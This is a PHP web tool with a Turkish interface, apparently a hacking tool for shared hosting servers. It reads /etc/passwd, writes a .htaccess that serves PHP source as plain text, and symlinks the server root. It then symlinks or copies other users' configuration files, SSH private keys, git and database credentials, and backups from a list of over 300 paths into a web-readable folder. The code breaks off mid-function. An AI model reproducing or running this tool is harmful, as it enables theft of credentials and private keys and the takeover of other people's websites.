<?php
// =============================================================================
// 2026proSymlink.php - Gelişmiş Symlink & Config Toplayıcı
// =============================================================================
// Versiyon: 2026.2.0 | Yazar: @onemoriarty | Lisans: GNU/GPL
// =============================================================================

@error_reporting(0);
@ini_set('html_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);
@ini_set('file_uploads', 1);
@set_time_limit(0);

// =============================================================================
// RENKLİ VE MODERN ARAYÜZ
// =============================================================================
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2026 Pro Symlink - Gelişmiş Config Toplayıcı</title>
    <meta property="og:title" content="2026 Pro Symlink"/>
    <meta property="og:description" content="Gelişmiş Symlink & Config Toplama Aracı"/>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #1a1f2f 100%);
            font-family: 'Roboto Mono', monospace;
            color: #00ff9d;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(0deg, rgba(0,255,157,0.03) 0px, rgba(0,255,157,0.03) 2px, transparent 2px, transparent 4px);
            pointer-events: none;
            animation: scan 8s linear infinite;
        }
        
        @keyframes scan {
            0% { background-position: 0 0; }
            100% { background-position: 0 20px; }
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }
        
        /* HEADER */
        .header {
            background: rgba(10, 20, 30, 0.95);
            border: 2px solid #00ff9d;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 157, 0.3);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0,255,157,0.1), transparent);
            animation: shine 3s infinite;
        }
        
        @keyframes shine {
            0% { transform: rotate(45deg) translate(-100%, -100%); }
            100% { transform: rotate(45deg) translate(100%, 100%); }
        }
        
        .glitch {
            font-family: 'Orbitron', sans-serif;
            font-size: 4em;
            font-weight: 900;
            text-transform: uppercase;
            position: relative;
            text-shadow: 0.05em 0 0 rgba(255,0,0,0.75), -0.05em -0.025em 0 rgba(0,255,255,0.75);
            animation: glitch 725ms infinite;
            color: #00ff9d;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .glitch span {
            position: absolute;
            top: 0;
            left: 0;
        }
        
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            33% { transform: translate(5px, -2px); }
            66% { transform: translate(-5px, 2px); }
        }
        
        .stats {
            display: flex;
            justify-content: space-around;
            flex-wrap: wrap;
            gap: 20px;
            margin-top: 20px;
        }
        
        .stat-box {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff9d;
            border-radius: 10px;
            padding: 15px 25px;
            text-align: center;
            min-width: 150px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 10px rgba(0,255,157,0.3); }
            50% { box-shadow: 0 0 20px rgba(0,255,157,0.6); }
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #00ff9d;
        }
        
        .stat-label {
            color: #8892b0;
            font-size: 0.9em;
        }
        
        /* FORM */
        .form-container {
            background: rgba(10, 20, 30, 0.9);
            border: 2px solid #00ff9d;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }
        
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            color: #00ff9d;
            margin-bottom: 5px;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        select, textarea, input[type="text"] {
            width: 100%;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff9d;
            border-radius: 5px;
            padding: 12px;
            color: #00ff9d;
            font-family: 'Roboto Mono', monospace;
            transition: all 0.3s;
        }
        
        select:hover, textarea:hover, input[type="text"]:hover {
            border-color: #ff00ff;
            box-shadow: 0 0 15px rgba(255,0,255,0.3);
        }
        
        textarea {
            min-height: 200px;
            resize: vertical;
        }
        
        .btn {
            background: transparent;
            border: 2px solid #00ff9d;
            color: #00ff9d;
            padding: 15px 30px;
            font-size: 1.1em;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s;
            border-radius: 5px;
            margin: 10px;
            position: relative;
            overflow: hidden;
        }
        
        .btn:hover {
            background: #00ff9d;
            color: #0a0f1e;
            box-shadow: 0 0 30px #00ff9d;
            transform: scale(1.05);
        }
        
        .btn:active {
            transform: scale(0.95);
        }
        
        .btn-danger {
            border-color: #ff0066;
            color: #ff0066;
        }
        
        .btn-danger:hover {
            background: #ff0066;
            color: #0a0f1e;
            box-shadow: 0 0 30px #ff0066;
        }
        
        /* RESULTS */
        .results {
            background: rgba(10, 20, 30, 0.9);
            border: 2px solid #00ff9d;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }
        
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .file-card {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff9d;
            border-radius: 8px;
            padding: 15px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .file-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,255,157,0.3);
            border-color: #ff00ff;
        }
        
        .file-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0,255,157,0.2), transparent);
            transition: left 0.5s;
        }
        
        .file-card:hover::before {
            left: 100%;
        }
        
        .file-icon {
            font-size: 2em;
            margin-bottom: 10px;
            color: #00ff9d;
        }
        
        .file-name {
            font-weight: bold;
            margin-bottom: 5px;
            word-break: break-all;
        }
        
        .file-size {
            font-size: 0.8em;
            color: #8892b0;
        }
        
        .file-actions {
            margin-top: 10px;
            display: flex;
            gap: 10px;
        }
        
        .file-actions a {
            color: #00ff9d;
            text-decoration: none;
            padding: 5px 10px;
            border: 1px solid #00ff9d;
            border-radius: 3px;
            font-size: 0.8em;
            transition: all 0.3s;
        }
        
        .file-actions a:hover {
            background: #00ff9d;
            color: #0a0f1e;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff9d;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: #00ff9d;
            width: 0%;
            transition: width 0.3s;
            animation: progress-pulse 2s infinite;
        }
        
        @keyframes progress-pulse {
            0%, 100% { opacity: 0.8; }
            50% { opacity: 1; }
        }
        
        .terminal {
            background: #000;
            border: 2px solid #00ff9d;
            border-radius: 10px;
            padding: 20px;
            font-family: 'Roboto Mono', monospace;
            color: #00ff9d;
            margin-top: 20px;
        }
        
        .terminal-line {
            margin: 5px 0;
            white-space: pre-wrap;
            word-break: break-all;
        }
        
        .terminal-line::before {
            content: '>';
            margin-right: 10px;
            color: #ff00ff;
        }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #00ff9d;
            color: #0a0f1e;
            padding: 15px 25px;
            border-radius: 5px;
            animation: slideIn 0.3s ease;
            z-index: 9999;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }
        
        /* YENİ EKLENEN ÖZELLİKLER */
        .filter-panel {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid #00ff9d;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
        }
        
        .checkbox-group {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
        }
        
        .checkbox-group label {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }
        
        .checkbox-group input[type="checkbox"] {
            width: auto;
            accent-color: #00ff9d;
        }
        
        .tab-bar {
            display: flex;
            gap: 2px;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .tab {
            flex: 1;
            padding: 10px;
            text-align: center;
            background: rgba(0, 0, 0, 0.5);
            color: #8892b0;
            cursor: pointer;
            transition: all 0.3s;
            border: none;
            font-family: 'Roboto Mono', monospace;
        }
        
        .tab:hover {
            background: rgba(0, 255, 157, 0.1);
            color: #00ff9d;
        }
        
        .tab.active {
            background: #00ff9d;
            color: #0a0f1e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="glitch">2026 PRO SYMLINK</h1>
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="totalUsers">0</div>
                    <div class="stat-label">Kullanıcı Bulundu</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="totalConfigs">0</div>
                    <div class="stat-label">Config Toplandı</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="totalSize">0 MB</div>
                    <div class="stat-label">Toplam Boyut</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="totalDomains">0</div>
                    <div class="stat-label">Domain Tespit Edildi</div>
                </div>
            </div>
        </div>

        <div class="form-container">
            <div class="tab-bar">
                <button class="tab active" onclick="showTab('basic')">Temel</button>
                <button class="tab" onclick="showTab('advanced')">Gelişmiş</button>
                <button class="tab" onclick="showTab('targets')">Hedefler</button>
                <button class="tab" onclick="showTab('tools')">Araçlar</button>
            </div>

            <form method="post" id="symlinkForm">
                <div id="basic-tab" class="tab-content">
                    <div class="form-grid">
                        <div class="form-group">
                            <label><i class="fas fa-home"></i> Home Dizini</label>
                            <select name="home">
                                <?php for($i=1;$i<=20;$i++): ?>
                                <option value="home<?php echo $i>1?$i:''; ?>">Home<?php echo $i>1?$i:''; ?></option>
                                <?php endfor; ?>
                                <option value="home">Home</option>
                                <option value="public_html">public_html</option>
                                <option value="www">www</option>
                                <option value="htdocs">htdocs</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-server"></i> HTTPD Tipi</label>
                            <select name="httpd_type">
                                <option value="apache1">Apache 1 (Basic)</option>
                                <option value="apache2" selected>Apache 2 (Full)</option>
                                <option value="litespeed">LiteSpeed</option>
                                <option value="nginx">Nginx</option>
                                <option value="openlitespeed">OpenLiteSpeed</option>
                                <option value="custom">Özel Config</option>
                            </select>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-bolt"></i> İşlem Tipi</label>
                            <select name="action_type">
                                <option value="both" selected>Symlink + Copy</option>
                                <option value="symlink">Sadece Symlink</option>
                                <option value="copy">Sadece Copy</option>
                                <option value="search">Sadece Ara (Config Bul)</option>
                                <option value="zip">Zip Olarak İndir</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group">
                        <label><i class="fas fa-users"></i> Kullanıcı Listesi (/etc/passwd'den alınır)</label>
                        <textarea name="passwd" id="passwd"><?php echo implode("\n", array_filter(array_map(function($line) { 
                            $parts = explode(':', $line); 
                            return $parts[0] ?? ''; 
                        }, file('/etc/passwd') ?: []))); ?></textarea>
                    </div>

                    <div class="form-group">
                        <label><i class="fas fa-cog"></i> Özel .htaccess Config</label>
                        <select name="xenziaworm">
                            <option value="Options Indexes FollowSymLinks\nDirectoryIndex xenziaworm.ghost\nAddType txt .php\nAddHandler txt .php">Apache 1 (Basic)</option>
                            <option value="Options all\nOptions +Indexes\nOptions +FollowSymLinks\nDirectoryIndex xenziaworm.ghost\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any" selected>Apache 2 (Full)</option>
                            <option value="Options +FollowSymLinks\nDirectoryIndex xenziaworm.ghost\nRemoveHandler .php\nAddType application/octet-stream .php">LiteSpeed</option>
                            <option value="Options +FollowSymLinks\nDirectoryIndex xenziaworm.ghost\nAddType application/x-httpd-php .php\nAddHandler application/x-httpd-php .php">Nginx (via PHP-FPM)</option>
                        </select>
                    </div>
                </div>

                <div id="advanced-tab" class="tab-content" style="display:none;">
                    <div class="filter-panel">
                        <h3 style="color:#00ff9d; margin-bottom:15px;"><i class="fas fa-filter"></i> Filtreleme Seçenekleri</h3>
                        <div class="checkbox-group">
                            <label><input type="checkbox" name="filter[]" value="wp" checked> WordPress</label>
                            <label><input type="checkbox" name="filter[]" value="whmcs" checked> WHMCS</label>
                            <label><input type="checkbox" name="filter[]" value="joomla" checked> Joomla</label>
                            <label><input type="checkbox" name="filter[]" value="magento" checked> Magento</label>
                            <label><input type="checkbox" name="filter[]" value="drupal" checked> Drupal</label>
                            <label><input type="checkbox" name="filter[]" value="prestashop" checked> PrestaShop</label>
                            <label><input type="checkbox" name="filter[]" value="opencart" checked> OpenCart</label>
                            <label><input type="checkbox" name="filter[]" value="phpbb" checked> phpBB</label>
                            <label><input type="checkbox" name="filter[]" value="vbulletin" checked> vBulletin</label>
                            <label><input type="checkbox" name="filter[]" value="mysql" checked> MySQL Config</label>
                            <label><input type="checkbox" name="filter[]" value="accesshash" checked> AccessHash</label>
                            <label><input type="checkbox" name="filter[]" value="env" checked> .env</label>
                            <label><input type="checkbox" name="filter[]" value="xml" checked> XML Config</label>
                            <label><input type="checkbox" name="filter[]" value="ini" checked> INI Files</label>
                            <label><input type="checkbox" name="filter[]" value="json" checked> JSON Config</label>
                        </div>
                    </div>

                    <div class="filter-panel">
                        <h3 style="color:#00ff9d; margin-bottom:15px;"><i class="fas fa-clock"></i> Zamanlama & Limitler</h3>
                        <div class="form-grid">
                            <div class="form-group">
                                <label>Max Çalışma Süresi (saniye)</label>
                                <input type="number" name="max_time" value="300" min="10" max="3600">
                            </div>
                            <div class="form-group">
                                <label>Max Dosya Boyutu (MB)</label>
                                <input type="number" name="max_size" value="10" min="1" max="100">
                            </div>
                            <div class="form-group">
                                <label>Max Kullanıcı Sayısı</label>
                                <input type="number" name="max_users" value="0" min="0" max="1000">
                            </div>
                            <div class="form-group">
                                <label>İşlem Gecikmesi (ms)</label>
                                <input type="number" name="delay" value="100" min="0" max="10000">
                            </div>
                        </div>
                    </div>

                    <div class="filter-panel">
                        <h3 style="color:#00ff9d; margin-bottom:15px;"><i class="fas fa-globe"></i> Domain Tespiti</h3>
                        <div class="form-group">
                            <label><input type="checkbox" name="detect_domains" checked> Domain'leri Otomatik Tespit Et</label>
                        </div>
                        <div class="form-group">
                            <label><input type="checkbox" name="generate_links" checked> Bulunan Config'leri Link Olarak Göster</label>
                        </div>
                    </div>
                </div>

                <div id="targets-tab" class="tab-content" style="display:none;">
                    <div class="filter-panel">
                        <h3 style="color:#00ff9d; margin-bottom:15px;"><i class="fas fa-bullseye"></i> Hedef Dosyalar (Otomatik 300+)</h3>
                        <div class="checkbox-group" style="max-height:400px; overflow-y:auto;">
                            <?php
                            $targetFiles = [
                                // WordPress
                                'public_html/wp-config.php' => 'WordPress Config',
                                'public_html/wp/wp-config.php' => 'WordPress (wp/)',
                                'public_html/blog/wp-config.php' => 'WordPress (blog/)',
                                'public_html/wordpress/wp-config.php' => 'WordPress (wordpress/)',
                                'public_html/site/wp-config.php' => 'WordPress (site/)',
                                'public_html/test/wp-config.php' => 'WordPress (test/)',
                                'public_html/demo/wp-config.php' => 'WordPress (demo/)',
                                'public_html/beta/wp-config.php' => 'WordPress (beta/)',
                                'public_html/new/wp-config.php' => 'WordPress (new/)',
                                'public_html/old/wp-config.php' => 'WordPress (old/)',
                                'public_html/wp-admin/wp-config.php' => 'WordPress (admin/)',
                                'public_html/wp-includes/wp-config.php' => 'WordPress (includes/)',
                                'public_html/wp-content/wp-config.php' => 'WordPress (content/)',
                                
                                // WHMCS
                                'public_html/configuration.php' => 'WHMCS/Joomla',
                                'public_html/whmcs/configuration.php' => 'WHMCS',
                                'public_html/clients/configuration.php' => 'WHMCS (clients/)',
                                'public_html/client/configuration.php' => 'WHMCS (client/)',
                                'public_html/billing/configuration.php' => 'WHMCS (billing/)',
                                'public_html/order/configuration.php' => 'WHMCS (order/)',
                                'public_html/orders/configuration.php' => 'WHMCS (orders/)',
                                'public_html/account/configuration.php' => 'WHMCS (account/)',
                                'public_html/accounts/configuration.php' => 'WHMCS (accounts/)',
                                'public_html/portal/configuration.php' => 'WHMCS (portal/)',
                                'public_html/support/configuration.php' => 'WHMCS (support/)',
                                'public_html/manage/configuration.php' => 'WHMCS (manage/)',
                                'public_html/manager/configuration.php' => 'WHMCS (manager/)',
                                'public_html/admin/configuration.php' => 'WHMCS (admin/)',
                                'public_html/administrator/configuration.php' => 'WHMCS (administrator/)',
                                
                                // MySQL
                                '.my.cnf' => 'MySQL Config',
                                '.mysql_history' => 'MySQL History',
                                'my.cnf' => 'MySQL Config',
                                '.my.cnf.bak' => 'MySQL Backup',
                                
                                // AccessHash
                                '.accesshash' => 'WHM AccessHash',
                                'accesshash' => 'AccessHash',
                                '.accesshash.bak' => 'AccessHash Backup',
                                
                                // .env
                                '.env' => 'Environment Config',
                                '.env.local' => 'Env Local',
                                '.env.production' => 'Env Production',
                                '.env.development' => 'Env Development',
                                '.env.example' => 'Env Example',
                                
                                // cPanel
                                '.cpanel' => 'cPanel Config',
                                '.cpanel.yml' => 'cPanel YAML',
                                '.cpanel.info' => 'cPanel Info',
                                'cpanel.config' => 'cPanel Config',
                                '.cpbackup.conf' => 'cPanel Backup',
                                
                                // Joomla
                                'configuration.php' => 'Joomla Config',
                                'configuration.php.bak' => 'Joomla Backup',
                                'configuration.php.old' => 'Joomla Old',
                                'configuration.php.new' => 'Joomla New',
                                
                                // Magento
                                'app/etc/local.xml' => 'Magento Config',
                                'app/etc/config.xml' => 'Magento Config',
                                'app/etc/env.php' => 'Magento Env',
                                'app/etc/di.xml' => 'Magento DI',
                                
                                // PrestaShop
                                'config/settings.inc.php' => 'PrestaShop',
                                'config/parameters.php' => 'PrestaShop Params',
                                'config/parameters.yml' => 'PrestaShop YAML',
                                'app/config/parameters.php' => 'PrestaShop App',
                                'app/config/parameters.yml' => 'PrestaShop YAML',
                                
                                // Drupal
                                'sites/default/settings.php' => 'Drupal Settings',
                                'sites/default/settings.local.php' => 'Drupal Local',
                                'sites/all/settings.php' => 'Drupal All',
                                'sites/default/default.settings.php' => 'Drupal Default',
                                
                                // OpenCart
                                'admin/config.php' => 'OpenCart Admin',
                                'config.php' => 'OpenCart Config',
                                'system/config.php' => 'OpenCart System',
                                
                                // phpBB
                                'config.php' => 'phpBB Config',
                                'forum/config.php' => 'phpBB Forum',
                                'phpbb/config.php' => 'phpBB',
                                
                                // vBulletin
                                'includes/config.php' => 'vBulletin',
                                'forum/includes/config.php' => 'vBulletin Forum',
                                'vb/includes/config.php' => 'vBulletin VB',
                                'vb5/includes/config.php' => 'vBulletin 5',
                                
                                // Laravel
                                '.env' => 'Laravel Env',
                                'config/app.php' => 'Laravel App',
                                'config/database.php' => 'Laravel DB',
                                'config/auth.php' => 'Laravel Auth',
                                'config/cache.php' => 'Laravel Cache',
                                'config/session.php' => 'Laravel Session',
                                'config/mail.php' => 'Laravel Mail',
                                
                                // Symfony
                                '.env' => 'Symfony Env',
                                'app/config/parameters.yml' => 'Symfony Params',
                                'config/parameters.yml' => 'Symfony Config',
                                
                                // CodeIgniter
                                'application/config/database.php' => 'CI Database',
                                'application/config/config.php' => 'CI Config',
                                'system/application/config/database.php' => 'CI System',
                                
                                // Yii
                                'protected/config/main.php' => 'Yii Main',
                                'protected/config/database.php' => 'Yii DB',
                                'config/web.php' => 'Yii Web',
                                'config/db.php' => 'Yii DB',
                                
                                // CakePHP
                                'app/Config/database.php' => 'CakePHP DB',
                                'app/Config/core.php' => 'CakePHP Core',
                                'config/app.php' => 'CakePHP App',
                                
                                // Other CMS
                                'sites/default/settings.php' => 'Backdrop',
                                'includes/configure.php' => 'Zen Cart',
                                'admin/includes/configure.php' => 'Zen Cart Admin',
                                'includes/config.php' => 'XenForo',
                                'library/config.php' => 'XenForo Lib',
                                'forum/includes/config.php' => 'MyBB',
                                'inc/config.php' => 'MyBB Inc',
                                
                                // Databases
                                '.pgpass' => 'PostgreSQL Pass',
                                '.psql_history' => 'PostgreSQL History',
                                '.mongorc.js' => 'MongoDB RC',
                                '.dbshell' => 'MongoDB Shell',
                                'mongod.conf' => 'MongoDB Config',
                                'postgresql.conf' => 'PostgreSQL Config',
                                'my.cnf' => 'MySQL Config',
                                'mysql.conf' => 'MySQL Config',
                                'mysqld.cnf' => 'MySQLD Config',
                                'client.cnf' => 'MySQL Client',
                                
                                // SSH Keys
                                '.ssh/id_rsa' => 'SSH Private Key',
                                '.ssh/id_dsa' => 'SSH DSA Key',
                                '.ssh/id_ecdsa' => 'SSH ECDSA Key',
                                '.ssh/id_ed25519' => 'SSH ED25519 Key',
                                '.ssh/authorized_keys' => 'SSH Authorized',
                                '.ssh/config' => 'SSH Config',
                                '.ssh/known_hosts' => 'SSH Known Hosts',
                                
                                // FTP
                                '.netrc' => 'FTP NetRC',
                                '.ftpconfig' => 'FTP Config',
                                'filezilla.xml' => 'FileZilla',
                                'recentservers.xml' => 'FileZilla Servers',
                                'sitemanager.xml' => 'FileZilla Sites',
                                
                                // Git
                                '.git/config' => 'Git Config',
                                '.git-credentials' => 'Git Credentials',
                                '.gitignore' => 'Git Ignore',
                                
                                // Composer
                                'composer.json' => 'Composer JSON',
                                'composer.lock' => 'Composer Lock',
                                'auth.json' => 'Composer Auth',
                                
                                // NPM
                                '.npmrc' => 'NPM Config',
                                'package.json' => 'Package JSON',
                                'package-lock.json' => 'NPM Lock',
                                'yarn.lock' => 'Yarn Lock',
                                
                                // Docker
                                '.docker/config.json' => 'Docker Config',
                                'docker-compose.yml' => 'Docker Compose',
                                'Dockerfile' => 'Dockerfile',
                                
                                // Apache/Nginx
                                '.htaccess' => 'Apache HTACCESS',
                                '.htpasswd' => 'Apache HTPASSWD',
                                'nginx.conf' => 'Nginx Config',
                                'httpd.conf' => 'Apache Config',
                                'apache2.conf' => 'Apache2 Config',
                                
                                // Config Files
                                'config.php' => 'Generic Config',
                                'config.inc.php' => 'Generic Config',
                                'config.inc' => 'Generic Config',
                                'config.json' => 'JSON Config',
                                'config.yml' => 'YAML Config',
                                'config.xml' => 'XML Config',
                                'settings.php' => 'Settings',
                                'settings.inc.php' => 'Settings Inc',
                                'database.php' => 'Database Config',
                                'db.php' => 'DB Config',
                                'db.config.php' => 'DB Config',
                                'db.inc.php' => 'DB Inc',
                                'mysql.php' => 'MySQL PHP',
                                'mysql.inc.php' => 'MySQL Inc',
                                
                                // Log Files
                                'error_log' => 'Error Log',
                                'access_log' => 'Access Log',
                                'debug.log' => 'Debug Log',
                                'wp-content/debug.log' => 'WP Debug',
                                'wp-content/uploads/error_log' => 'Uploads Log',
                                'logs/error_log' => 'Logs Error',
                                'logs/access_log' => 'Logs Access',
                                
                                // Backup Files
                                'backup.zip' => 'Backup ZIP',
                                'backup.tar.gz' => 'Backup TAR',
                                'backup.sql' => 'Backup SQL',
                                'dump.sql' => 'SQL Dump',
                                'db_backup.sql' => 'DB Backup',
                                'wp_backup.sql' => 'WP Backup',
                                'backup.tgz' => 'Backup TGZ',
                                'site_backup.zip' => 'Site Backup'
                            ];
                            
                            foreach($targetFiles as $file => $desc):
                                echo "<label><input type='checkbox' name='targets[]' value='$file' checked> $desc ($file)</label>\n";
                            endforeach;
                            ?>
                        </div>
                    </div>
                </div>

                <div id="tools-tab" class="tab-content" style="display:none;">
                    <div class="filter-panel">
                        <h3 style="color:#00ff9d; margin-bottom:15px;"><i class="fas fa-wrench"></i> Ek Araçlar</h3>
                        <div class="checkbox-group">
                            <label><input type="checkbox" name="tools[]" value="symlink_root" checked> Root Symlink (000~ROOT~000)</label>
                            <label><input type="checkbox" name="tools[]" value="sql_finder" checked> SQL Config Bulucu</label>
                            <label><input type="checkbox" name="tools[]" value="domain_extractor" checked> Domain Çıkarıcı</label>
                            <label><input type="checkbox" name="tools[]" value="password_finder" checked> Password Bulucu</label>
                            <label><input type="checkbox" name="tools[]" value="backup_finder" checked> Backup Dosyası Bulucu</label>
                            <label><input type="checkbox" name="tools[]" value="email_extractor" checked> Email Çıkarıcı</label>
                            <label><input type="checkbox" name="tools[]" value="ip_finder" checked> IP Adresi Bulucu</label>
                            <label><input type="checkbox" name="tools[]" value="cpanel_scanner" checked> cPanel Scanner</label>
                            <label><input type="checkbox" name="tools[]" value="whm_scanner" checked> WHM Scanner</label>
                            <label><input type="checkbox" name="tools[]" value="zip_all" checked> Tümünü ZIP'le</label>
                        </div>
                    </div>
                </div>

                <div style="text-align:center; margin-top:20px;">
                    <button type="submit" name="conf" value="true" class="btn"><i class="fas fa-play"></i> İşlemi Başlat</button>
                    <button type="button" class="btn btn-danger" onclick="clearAll()"><i class="fas fa-trash"></i> Temizle</button>
                    <button type="button" class="btn" onclick="selectAll()"><i class="fas fa-check-double"></i> Tümünü Seç</button>
                    <button type="button" class="btn" onclick="deselectAll()"><i class="fas fa-times"></i> Seçimi Kaldır</button>
                </div>
            </form>
        </div>

        <?php
        // =============================================================================
        // İŞLEM MOTORU
        // =============================================================================
        if (isset($_POST['conf'])) {
            $home = $_POST['home'] ?? 'home';
            $httpd_type = $_POST['httpd_type'] ?? 'apache2';
            $action_type = $_POST['action_type'] ?? 'both';
            $delay = intval($_POST['delay'] ?? 100);
            $max_time = intval($_POST['max_time'] ?? 300);
            $max_users = intval($_POST['max_users'] ?? 0);
            $selected_filters = $_POST['filter'] ?? [];
            $selected_targets = $_POST['targets'] ?? [];
            $selected_tools = $_POST['tools'] ?? [];
            
            set_time_limit($max_time);
            
            // Çıktı dizini oluştur
            $output_dir = 'symlink_' . date('Ymd_His');
            @mkdir($output_dir, 0755);
            @chdir($output_dir);
            
            // .htaccess oluştur
            $htaccess = $_POST['xenziaworm'] ?? "Options Indexes FollowSymLinks\nDirectoryIndex xenziaworm.ghost\nAddType txt .php\nAddHandler txt .php";
            file_put_contents(".htaccess", $htaccess . "\n");
            
            // Root symlink
            if (in_array('symlink_root', $selected_tools)) {
                @symlink('/', '000~ROOT~000');
                echo "<div class='terminal'><div class='terminal-line'>✓ Root symlink oluşturuldu</div></div>";
            }
            
            // Kullanıcı listesi
            $passwd = explode("\n", trim($_POST['passwd'] ?? ''));
            $total_users = count($passwd);
            $processed = 0;
            $found_configs = 0;
            $total_size = 0;
            $detected_domains = [];
            
            echo "<div class='progress-bar'><div class='progress-fill' id='progress' style='width:0%'></div></div>";
            echo "<div class='results' id='results'>";
            
            // Domain tespiti için
            if (isset($_POST['detect_domains'])) {
                foreach ($passwd as $user) {
                    $user = trim($user);
                    if (empty($user)) continue;
                    
                    // public_html içindeki domain'leri tara
                    $public_html_path = "/{$home}/{$user}/public_html";
                    if (is_dir($public_html_path)) {
                        $files = @scandir($public_html_path);
                        if ($files) {
                            foreach ($files as $file) {
                                if ($file != '.' && $file != '..' && is_dir($public_html_path . '/' . $file)) {
                                    if (strpos($file, '.') !== false && !strpos($file, '/')) {
                                        $detected_domains[] = $file;
                                    }
                                }
                            }
                        }
                    }
                }
                $detected_domains = array_unique($detected_domains);
            }
            
            // Hedef dosyaları işle
            $target_files = $selected_targets;
            
            foreach ($passwd as $index => $user) {
                $user = trim($user);
                if (empty($user)) continue;
                
                if ($max_users > 0 && $processed >= $max_users) break;
                
                // İlerleme çubuğu
                $percent = ($processed / $total_users) * 100;
                echo "<script>document.getElementById('progress').style.width='{$percent}%';</script>";
                
                // Gecikme
                if ($delay > 0) usleep($delay * 1000);
                
                echo "<div class='terminal'><div class='terminal-line'>İşleniyor: {$user}</div></div>";
                
                foreach ($target_files as $target) {
                    $source_path = "/{$home}/{$user}/{$target}";
                    $target_name = preg_replace('/[^a-zA-Z0-9]/', '_', $user) . '_' . basename($target);
                    
                    if (file_exists($source_path)) {
                        $file_size = filesize($source_path);
                        $total_size += $file_size;
                        $found_configs++;
                        
                        // İşlem tipine göre
                        if ($action_type == 'symlink' || $action_type == 'both') {
                            @symlink($source_path, $target_name . '.symlink');
                        }
                        if ($action_type == 'copy' || $action_type == 'both') {
                            @copy($source_path, $target_name . '.txt');
                        }
                        
                        // Domain bilgisi ekle
                        if (isset($_POST['detect_domains']) && !empty($detected_domains)) {
                            $domain_info = implode(', ', array_slice($detected_domains, 0, 5));
                            file_put_contents($target_name . '.info', "Domains: {$domain_info}\n");
                        }
                        
                        echo "<div class='file-card'>";
                        echo "<div class='file-icon'><i class='fas fa-file-code'></i></div>";
                        echo "<div class='file-name'>" . htmlspecialchars(basename($target_name . '.txt')) . "</div>";
                        echo "<div class='file-size'>Boyut: " . formatBytes($file_size) . "</div>";
                        echo "<div class='file-actions'>";
                        if (file_exists($target_name . '.txt')) {
                            echo "<a href='{$output_dir}/{$target_name}.txt' target='_blank'><i class='fas fa-eye'></i> Görüntüle</a>";
                        }
                        echo "</div></div>";
                        
                        // SQL config bulucu
                        if (in_array('sql_finder', $selected_tools)) {
                            $content = @file_get_contents($source_path);
                            if ($content) {
